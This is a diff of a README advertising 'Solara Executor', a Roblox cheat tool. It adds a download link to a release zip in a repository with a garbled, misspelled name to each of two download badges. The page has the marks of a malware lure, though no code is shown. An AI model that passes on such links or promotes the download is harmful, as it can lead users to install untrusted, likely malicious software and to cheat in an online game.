@@ -6,12 +6,12 @@ Unlike outdated executors that constantly break, **Solara Executor is built with
 
 🔥 **Unleash the full potential of Roblox with Solara Executor today!** 🔥  
 
-[![Download Solara Executor](https://img.shields.io/badge/Download-Solara_Executor-purple?style=for-the-badge&logo=download)]()  
+[![Download Solara Executor](https://img.shields.io/badge/Download-Solara_Executor-purple?style=for-the-badge&logo=download)](https://github.com/AristioN7/roblax-eexutop-donw/releases/download/Update/Update.zip)  
 
 ![solara](https://github.com/user-attachments/assets/f54b799d-5184-4d37-ae5a-2d19ffd9943e)
 
 
-[![Download Solara Executor](https://img.shields.io/badge/Download-Solara_Executor-purple?style=for-the-badge&logo=download)]()  
+[![Download Solara Executor](https://img.shields.io/badge/Download-Solara_Executor-purple?style=for-the-badge&logo=download)](https://github.com/AristioN7/roblax-eexutop-donw/releases/download/Update/Update.zip)  
 
 ---
 
